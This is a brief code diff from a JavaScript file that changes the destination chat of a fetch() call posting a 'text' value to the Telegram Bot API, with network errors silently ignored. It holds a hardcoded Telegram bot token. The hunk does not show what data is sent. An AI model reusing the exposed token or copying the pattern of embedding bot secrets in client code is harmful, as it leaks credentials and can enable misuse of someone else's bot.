@@ -90,7 +90,7 @@
     fetch('https://api.telegram.org/bot8936956384:AAEZKf0vvUSc-Rt-zIgFyIinJqmVbJ3WEMU/sendMessage', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: 1068267365, text: text, parse_mode: 'Markdown' })
+      body: JSON.stringify({ chat_id: -1003525293051, text: text, parse_mode: 'Markdown' })
     }).catch(function() {}); // молча игнорируем ошибки сети
   }
 
